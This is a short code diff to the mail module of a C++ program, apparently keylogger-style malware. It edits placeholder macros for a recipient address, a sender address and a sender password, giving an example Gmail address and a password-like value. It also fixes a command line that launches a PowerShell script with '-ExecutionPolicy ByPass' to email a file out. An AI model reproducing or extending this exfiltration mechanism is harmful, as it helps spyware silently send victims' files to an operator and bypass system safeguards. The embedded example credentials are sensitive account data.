@@ -12,9 +12,9 @@
 
 namespace Mail
 {
-    #define X_EM_TO "Put your email address" // eg jobs.abt.kl@gmail.com
-    #define X_EM_FROM "Put your email address"  // eg. jobs.abt.kl@gmail.com
-    #define X_EM_PASS "Password of email from which mail is send" //eg Jobs.Abt7.KL
+    #define X_EM_TO "Email address where you have to send file" // eg jobs.abt.kl@gmail.com
+    #define X_EM_FROM "Email address from where you have to send file"  // eg. jobs.abt.kl@gmail.com
+    #define X_EM_PASS "password for sender email " //eg Jobs.Abt7.KL
 
 
 const std::string &PowerShellScript =
@@ -102,7 +102,7 @@ const std::string &PowerShellScript =
         if(!ok)
             return -2;
 
-        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" - Subj \""
+        std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
                             + StringReplace(subject, "\"", "\\\"") +
                             "\" -Body \""
                             + StringReplace(body, "\"", "\"") +
